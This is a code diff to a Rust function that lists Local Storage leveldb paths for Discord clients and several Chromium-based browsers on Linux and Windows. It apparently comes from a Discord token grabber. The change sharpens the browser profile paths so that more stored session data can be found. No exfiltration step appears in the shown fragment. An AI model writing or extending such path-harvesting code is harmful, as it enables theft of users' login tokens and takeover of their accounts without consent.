@@ -18,10 +18,11 @@ pub fn get() -> Vec<String> {
         format!("{}/google-chrome-unstable/Default", config_path), // Google Chrome Dev
         format!("{}/chromium/Default", config_path),           // Chromium
         format!("{}/vivaldi/Default", config_path),            // Vivaldi
-        format!("{}/BraveSoftware", config_path),              // Brave
-        format!("{}/opera", config_path),                      // Opera
-        format!("{}/yandex-browser", config_path),             // Yandex
-        format!("{}/yandex-browser-beta", config_path),        // Yandex Beta
+        format!("{}/BraveSoftware/Brave-Browser/Default", config_path), // Brave
+        format!("{}/BraveSoftware/Brave-Browser-Nightly/Default", config_path), // Brave Nightly
+        format!("{}/opera/Default", config_path),                      // Opera
+        format!("{}/yandex-browser/Default", config_path),             // Yandex
+        format!("{}/yandex-browser-beta/Default", config_path),        // Yandex Beta
     ]
     .iter()
     .map(|p| format!("{}/Local Storage/leveldb", p))
@@ -37,7 +38,7 @@ pub fn get() -> Vec<String> {
         format!("{}\\discord", roaming),                          // Discord
         format!("{}\\discordcanary", roaming),                    // Discord Canary
         format!("{}\\discordptb", roaming),                       // Discord PTB
-        format!("{}\\Opera Software\\Opera Stable", roaming),    // Opera
+        format!("{}\\Opera Software\\Opera Stable\\User Data\\Default", roaming),    // Opera
         format!("{}\\Google\\Chrome\\User Data\\Default", local), // Google Chrome
         format!("{}\\Google\\Chrome Beta\\User Data\\Default", local), // Google Chrome Beta
         format!("{}\\Google\\Chrome SxS\\User Data\\Default", local), // Google Chrome Canary
